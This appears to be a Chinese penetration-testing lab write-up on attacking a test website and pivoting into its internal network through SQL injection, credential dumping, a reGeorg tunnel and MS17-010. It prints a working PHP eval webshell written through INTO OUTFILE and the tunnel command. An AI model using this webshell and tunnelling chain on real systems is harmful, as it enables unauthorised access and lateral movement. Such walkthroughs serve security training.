# 一次内网渗透测试实验过程

> 原文：[http://mp.weixin.qq.com/s?\_\_biz=Mzg5OTY2NjUxMw==&mid=2247485576&idx=1&sn=050ce9feeeb55d2bbb3b20d3773e6c61&chksm=c04e8fb6f73906a08bc096be67eb5ac8aec378be0136d197cf0a09c673b7b5a877b4624c0ac5&scene=126&sessionid=1681663062#rd](http://mp.weixin.qq.com/s?__biz=Mzg5OTY2NjUxMw==&mid=2247485576&idx=1&sn=050ce9feeeb55d2bbb3b20d3773e6c61&chksm=c04e8fb6f73906a08bc096be67eb5ac8aec378be0136d197cf0a09c673b7b5a877b4624c0ac5&scene=126&sessionid=1681663062#rd)

**渗透测试过程**测试流程通过渗透网站拿到webshell，然后通过webshell拿到网站主机系统权限。发现受害主机有两张网卡，另一张网卡下有两台存活的内网主机，然后我们就尝试渗透存活的内网主机看能不能拿到系统权限，最后发现两台内网主机都开启了445端口，然后搜索了一下445端口漏洞发现有个最新的m17\_010可能可以利用，结果真的通过ms17\_010成功获得了内网主机的权限。目标网站ip：192.168.31.196**测试过程**浏览网站通过手工测试发现http://jy.test.com/hr/hr.php?hrid=15处有注入点![](../Images/cd26ddd0ee10f9a54c40c46bc5500e26.png)  
尝试利用sqlmap工具跑一下这个注入点，看能不能注出有用的信息![](../Images/b583ebb538bfd3c4106bcfacdc3383a0.png)通过测试发现这个注入点果然可以进行注入![](../Images/b583ebb538bfd3c4106bcfacdc3383a0.png)然后利用该注入点进行尝试注出网站后台登录账号密码![](../Images/d98d0b8302c7f7e4d3603784f378bff9.png)发现跑出来的网站后台密码是用md5加密的，所以利用md5解密一下，发现只有两个权限较低的密码可以解密，而权限较高的admin账号解不开。不过问题不大，先用登录后台（后台登录界面可以用御剑跑出来）看一下![](../Images/87994d13adfd677c832a479864f54cba.png)利用御剑跑出的后台目录里有个phpinfo页面，说不定可以得到一些有用的信息![](../Images/b6f05afb6c37c6be360cc2dbaa86c73f.png)发现可以得到网站文件的绝对路径![](../Images/4a5aadc5245f692178b1d999eb6b8842.png)发现网站后台数据维护处可以执行sql语句，通过phpinfo页面知道了网站绝对路径，可以尝试在此处写入php一句话木马

*   

```
`select "<?php eval($_POST[123456]);?>" into outfile "/UPUPW_AP5.2/vhosts/jy.test.com/321.php" `
```

设置kali的proxychains代理地址和端口命令：vi /etc/proxychains.conf将dynamic\_chain前的#去掉![](../Images/66066959eab755266d98d631822639c8.png)设置代理地址和端口后:wq退出![](../Images/3c28aa57e42303b45856ba4da7eb0921.png)配置好后通过reGeory来大同本地和目标的通道

```
`python reGeorgSocksProxy.py -p 9050 -l 0.0.0.0 -u http://192.168.31.196/tunnel.php`
```
